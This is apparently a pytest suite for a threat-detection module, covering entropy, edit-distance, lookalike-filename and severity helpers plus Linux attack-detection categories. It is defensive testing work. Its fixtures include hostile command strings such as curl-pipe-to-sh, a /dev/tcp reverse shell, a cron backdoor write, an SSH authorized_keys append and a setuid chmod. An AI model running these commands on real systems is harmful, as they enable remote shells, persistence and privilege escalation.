"""Tests for pure heuristic functions in app.threat_detection."""

from __future__ import annotations

import pytest

from app.threat_detection import (
    _edit_distance,
    _has_visual_trick,
    _max_severity,
    _shannon_entropy,
    _smart_excerpt,
)

# ── _shannon_entropy ─────────────────────────────────────────────────────────


class TestShannonEntropy:
    def test_empty_string(self):
        assert _shannon_entropy("") == 0.0

    def test_single_char(self):
        assert _shannon_entropy("aaaa") == 0.0

    def test_two_equal_chars(self):
        # "ab" → 1.0 bit
        assert _shannon_entropy("ab") == pytest.approx(1.0)

    def test_uniform_distribution(self):
        # 4 distinct chars, equal frequency → 2.0 bits
        assert _shannon_entropy("abcd") == pytest.approx(2.0)

    def test_high_entropy_string(self):
        s = "aB3$xY7!qZ9@"
        ent = _shannon_entropy(s)
        assert ent > 3.0


# ── _edit_distance ───────────────────────────────────────────────────────────


class TestEditDistance:
    def test_identical(self):
        assert _edit_distance("abc", "abc") == 0

    def test_insert(self):
        assert _edit_distance("abc", "abcd") == 1

    def test_delete(self):
        assert _edit_distance("abcd", "abc") == 1

    def test_replace(self):
        assert _edit_distance("abc", "axc") == 1

    def test_empty_strings(self):
        assert _edit_distance("", "") == 0
        assert _edit_distance("abc", "") == 3
        assert _edit_distance("", "xyz") == 3

    def test_completely_different(self):
        assert _edit_distance("abc", "xyz") == 3


# ── _has_visual_trick ────────────────────────────────────────────────────────


class TestHasVisualTrick:
    def test_o_zero_swap(self):
        assert _has_visual_trick("sv0host.exe", "svohost.exe") is True

    def test_transposition(self):
        assert _has_visual_trick("expolrer.exe", "explorer.exe") is True

    def test_single_char_insertion(self):
        assert _has_visual_trick("svchostt.exe", "svchost.exe") is True

    def test_no_trick_exact_match(self):
        # exact match is not a trick
        assert _has_visual_trick("svchost.exe", "svchost.exe") is False

    def test_empty_after_strip(self):
        assert _has_visual_trick(".exe", ".exe") is False

    def test_length_too_different(self):
        assert _has_visual_trick("abc.exe", "abcdefgh.exe") is False


# ── _smart_excerpt ───────────────────────────────────────────────────────────


class TestSmartExcerpt:
    def test_short_value_returned_as_is(self):
        val = "hello world"
        assert _smart_excerpt(val, 0, 5) == val

    def test_long_value_truncated(self):
        val = "A" * 200
        result = _smart_excerpt(val, 50, 55, max_len=80)
        assert len(result) <= 80


# ── _max_severity ────────────────────────────────────────────────────────────


class TestMaxSeverity:
    def test_single(self):
        assert _max_severity("high") == "high"

    def test_ordering(self):
        assert _max_severity("low", "high") == "high"
        assert _max_severity("informational", "critical") == "critical"
        assert _max_severity("medium", "low") == "medium"

    def test_no_args(self):
        assert _max_severity() == "informational"

    def test_unknown_severity(self):
        assert _max_severity("banana", "low") == "low"


# ── Linux categories (shipped config/threat_detection.yaml) ─────────────────


class TestLinuxCategories:
    @staticmethod
    def _detect(event: dict) -> dict:
        from app.threat_detection import compute_threat_detection

        return compute_threat_detection([[event]])

    def test_gtfobins_hit_on_exe(self):
        res = self._detect({"exe": "/usr/bin/nmap"})
        assert "gtfobins_usage" in res["categories"]

    def test_gtfobins_hit_on_comm(self):
        res = self._detect({"comm": "socat"})
        assert "gtfobins_usage" in res["categories"]

    def test_gtfobins_no_hit_on_regular_daemon(self):
        res = self._detect({"exe": "/usr/sbin/sshd"})
        assert "gtfobins_usage" not in res["categories"]

    def test_download_exec_curl_pipe_sh(self):
        res = self._detect({"proctitle": "curl http://x.example/a | sh"})
        assert "linux_download_exec" in res["categories"]

    def test_download_exec_plain_curl_no_hit(self):
        res = self._detect({"proctitle": "curl https://example.com/health"})
        assert "linux_download_exec" not in res["categories"]

    def test_download_exec_dev_tcp_reverse_shell(self):
        res = self._detect({"proctitle": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"})
        assert "linux_download_exec" in res["categories"]

    def test_download_exec_base64_decode_pipe(self):
        res = self._detect({"proctitle": "echo aGk= | base64 -d | sh"})
        assert "linux_download_exec" in res["categories"]

    def test_persistence_cron_write(self):
        res = self._detect({"proctitle": "bash -c 'echo evil >> /etc/cron.d/backdoor'"})
        assert "linux_persistence" in res["categories"]

    def test_persistence_authorized_keys(self):
        res = self._detect({"proctitle": "cat pub.key >> /home/user/.ssh/authorized_keys"})
        assert "linux_persistence" in res["categories"]

    def test_priv_esc_setuid_chmod(self):
        res = self._detect({"proctitle": "chmod u+s /tmp/rootshell"})
        assert "linux_priv_esc" in res["categories"]

    def test_priv_esc_suid_find(self):
        res = self._detect({"proctitle": "find / -perm -4000 -type f"})
        assert "linux_priv_esc" in res["categories"]

    def test_obfuscation_reads_proctitle(self):
        res = self._detect({"proctitle": "pwsh -c [Convert]::FromBase64String($x)"})
        assert "cmdline_obfuscation" in res["categories"]

    def test_windows_event_untouched_by_linux_categories(self):
        res = self._detect({"Image": "C:\\Windows\\System32\\certutil.exe"})
        assert "lolbin_usage" in res["categories"]
        assert "gtfobins_usage" not in res["categories"]
        assert "linux_download_exec" not in res["categories"]


def test_every_regex_pattern_is_case_insensitive():
    """Patterns match attacker-chosen casing, not just the casing in the YAML.

    All but two entries in config/threat_detection.yaml carried an inline `(?i)`. One of
    the exceptions was `double_extension`, so `invoice.pdf.exe` was flagged but
    `invoice.pdf.EXE` sailed through — the casing an attacker is more likely to use.
    Compiling with re.IGNORECASE removes the per-entry footgun entirely.
    """
    import re

    from app.threat_detection import get_threat_config

    case_sensitive = [
        f"{key}/{p['name']}"
        for key, cat in get_threat_config().items()
        if isinstance(cat, dict)
        for chk in (cat.get("checks") or [])
        for p in (chk.get("compiled_patterns") or [])
        if not p["regex"].flags & re.IGNORECASE
    ]
    assert not case_sensitive, f"case-sensitive threat patterns: {case_sensitive}"


def test_double_extension_matches_uppercase():

    from app.threat_detection import get_threat_config

    rx = next(
        p["regex"]
        for cat in get_threat_config().values()
        if isinstance(cat, dict)
        for chk in (cat.get("checks") or [])
        for p in (chk.get("compiled_patterns") or [])
        if p["name"] == "double_extension"
    )
    assert rx.search("invoice.pdf.exe")
    assert rx.search("invoice.pdf.EXE")
    assert rx.search("Report.doc.Scr")
    assert not rx.search("report.pdf")
